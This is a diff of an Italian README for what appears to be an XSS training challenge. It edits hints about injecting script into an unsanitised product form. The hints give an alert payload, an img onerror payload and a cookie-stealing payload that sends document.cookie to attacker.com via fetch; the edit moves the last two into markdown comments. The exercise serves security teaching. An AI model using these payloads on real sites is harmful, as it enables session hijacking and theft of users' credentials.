@@ -14,10 +14,13 @@ Sarà possibile eseguire codice malevolo nel browser dell'admin e ottenere il su
 
 ## Suggerimenti
 - Il form di creazione dei prodotti accetta input arbitrari e li visualizza nella pagina senza sanitizzazione.
-- Prova a inserire un payload come `<script>alert('XSS!')</script>` nel nome o nella descrizione di un prodotto.
-- Puoi anche provare a rubare il cookie dell'admin inviandolo a un tuo server con `<script>fetch('https://attacker.com/log?cookie='+encodeURIComponent(document.cookie))</script>`.
+- Prova a inserire un payload come `<script>alert('XSS!')</script>` nel nome o nella descrizione di un prodotto..
 - Ci sono dei siti come [Beeceptor](https://beeceptor.com/) che ti permettono di creare un server fittizio per ricevere i dati inviati con `fetch`.
-- È possibile iniettare codice JavaScript anche nell'URL di un'immagine, ad esempio `<img src=x onerror="alert('XSS!')">`.
+- È possibile iniettare codice JavaScript anche nell'URL di un'immagine 
+
+[//]: # (- Puoi anche provare a rubare il cookie dell'admin inviandolo a un tuo server con `<script>fetch('https://attacker.com/log?cookie='+encodeURIComponent(document.cookie))</script>`.)
+
+[//]: # (, ad esempio `<img src=x onerror="alert('XSS!')">`.)
 
 ## Avviare il server:
 ```bash
